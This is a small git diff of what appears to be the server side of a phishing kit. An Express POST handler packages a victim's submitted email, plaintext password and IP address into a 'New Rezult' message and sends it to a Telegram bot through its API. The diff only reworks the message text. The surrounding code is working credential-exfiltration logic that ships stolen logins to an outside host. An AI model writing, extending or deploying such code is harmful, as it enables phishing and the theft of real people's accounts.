@@ -34,10 +34,11 @@ app.post("/", async (req, res) => {
         return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Escape special characters
     };
 
-    const message = escapeMarkdown(`🔴 Login Attempt
+    const message = escapeMarkdown(`🔴 New Rezult: 
 👤 Email: ${email}
 🛑 Password: ${password}
-📍 IP: ${ip}`);
+📍 IP: ${ip}
+ 🚀💻`);
 
     try {
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
